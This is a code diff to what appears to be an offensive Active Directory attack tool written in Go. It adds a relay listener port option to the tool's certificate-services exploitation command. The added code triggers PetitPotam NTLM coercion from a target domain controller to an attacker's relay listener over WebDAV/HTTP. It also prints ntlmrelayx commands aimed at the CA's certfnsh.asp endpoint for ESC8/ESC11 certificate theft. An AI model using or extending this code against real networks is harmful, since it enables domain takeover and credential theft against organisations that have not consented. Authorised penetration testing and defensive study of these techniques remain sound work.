@@ -505,14 +505,22 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 		}
 		// If --listener-ip is set, trigger PetitPotam coercion automatically
 		listenerIP, _ := cmd.Flags().GetString("listener-ip")
+		listenerPort, _ := cmd.Flags().GetInt("listener-port")
 		if listenerIP != "" {
-			fmt.Printf("\n[*] Triggering PetitPotam coercion: %s → %s\n", cfg.TargetDC, listenerIP)
-			if coerceErr := pki.CoerceNTLMAuth(cfg.TargetDC, listenerIP, pki.CoercePetitPotam); coerceErr != nil {
+			if listenerPort > 0 {
+				fmt.Printf("\n[*] Triggering PetitPotam coercion: %s → %s:%d (WebDAV/HTTP)\n", cfg.TargetDC, listenerIP, listenerPort)
+				fmt.Printf("[*] ntlmrelayx on pivot: ntlmrelayx.py -t %scertfnsh.asp --adcs --template %s -smb-port %d\n",
+					esc8Findings[0].HTTPEndpoint, templateName, listenerPort)
+			} else {
+				fmt.Printf("\n[*] Triggering PetitPotam coercion: %s → %s (SMB/445)\n", cfg.TargetDC, listenerIP)
+			}
+			if coerceErr := pki.CoerceNTLMAuth(cfg.TargetDC, listenerIP, listenerPort, pki.CoercePetitPotam); coerceErr != nil {
 				fmt.Printf("[!] PetitPotam coercion failed: %v\n", coerceErr)
 				fmt.Printf("[*] Manual: PetitPotam.py %s %s\n", listenerIP, cfg.TargetDC)
 			}
 		} else {
 			fmt.Printf("\n[*] To auto-trigger coercion, add: --listener-ip <YOUR_RELAY_IP>\n")
+			fmt.Printf("[*] For non-admin pivot, add: --listener-port <PORT> (uses WebDAV for HTTP auth on custom port)\n")
 			fmt.Printf("[*] Or manually: PetitPotam.py <LISTENER_IP> %s\n", cfg.TargetDC)
 		}
 		fmt.Println("\n[*] After obtaining the certificate via relay:")
@@ -711,7 +719,8 @@ func init() {
 	pkiCmd.Flags().String("pfx-password", "", "Password for PFX archive (default: empty/unencrypted)")
 	pkiCmd.Flags().String("ca", "", "Target CA name for ESC7 exploitation")
 	pkiCmd.Flags().String("attacker-dn", "", "Attacker's LDAP DN for ESC9 exploitation (e.g., CN=attacker,CN=Users,DC=corp,DC=local)")
-	pkiCmd.Flags().String("listener-ip", "", "Attacker relay listener IP for ESC8/ESC11 (triggers PetitPotam coercion automatically)")
+	pkiCmd.Flags().String("listener-ip", "", "Attacker relay listener IP for ESC8/ESC11 (triggers PetitPotam coercion)")
+	pkiCmd.Flags().Int("listener-port", 0, "Relay listener port (>1024 for non-admin pivot; uses WebDAV/HTTP instead of SMB)")
 
 	// Output flags
 	pkiCmd.Flags().StringP("output", "o", "", "Output file path")
